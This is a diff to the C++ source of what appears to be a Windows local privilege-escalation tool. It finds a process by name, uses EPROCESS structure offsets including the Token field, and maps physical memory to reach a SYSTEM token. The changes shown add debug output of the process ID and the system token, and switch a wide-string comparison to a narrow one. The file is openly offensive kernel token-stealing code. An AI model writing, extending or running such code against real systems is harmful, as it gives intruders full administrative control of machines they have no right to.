@@ -17,8 +17,6 @@ unsigned __int64 _EPROCESS_ImageFileName_offset = 0;
 unsigned __int64 _EPROCESS_UniqueProcessId_offset = 0;
 unsigned __int64 _EPROCESS_Token_offset = 0;
 
-
-
 void printBytes(void* ptr, int size)
 {
 	unsigned char* p = (unsigned char*)ptr;
@@ -48,6 +46,7 @@ int main(int argc, char** argv)
 	// detect if process name is used instead of processID
 	if (procName.find(".exe") != std::string::npos)
 	{
+		std::cout << argv[1] << std::endl;
 		PROCESSENTRY32 entry;
 		// Before calling the Process32First function, set this member to sizeof(PROCESSENTRY32).
 		// If you do not initialize dwSize, Process32First fails.
@@ -59,13 +58,14 @@ int main(int argc, char** argv)
 		{
 			while (Process32Next(snapshot, &entry) == TRUE)
 			{
-				if (wcscmp(entry.szExeFile, argvW[1]) == 0)
+				if (strcmp(entry.szExeFile, argv[1]) == 0)
 				{
 					procId = entry.th32ProcessID;
+					std::cout << "procid = " << procId << std::endl;
 				}
 			}
 		}
-		// very importent to close the handle 
+		// very importent to close the handle
 		CloseHandle(snapshot);
 		if (procId == 0) {
 			std::cout << "[-] Could not find process: " << argv[1] << std::endl;
@@ -156,6 +156,7 @@ int main(int argc, char** argv)
 			return -1;
 		}
 	}
+	printf("system token = %x\n", systemToken);
 
 	for (size_t i = 0; i < EPROCESS_target_size; i++) {
 		if (MapPhysicalMemory((HANDLE) * (PDWORD64)hPhysicalMemory, (EPROCESS_target[i] & ~((unsigned __int64)-1 & 0xFFF)), 0x4000, buf) == FALSE) {
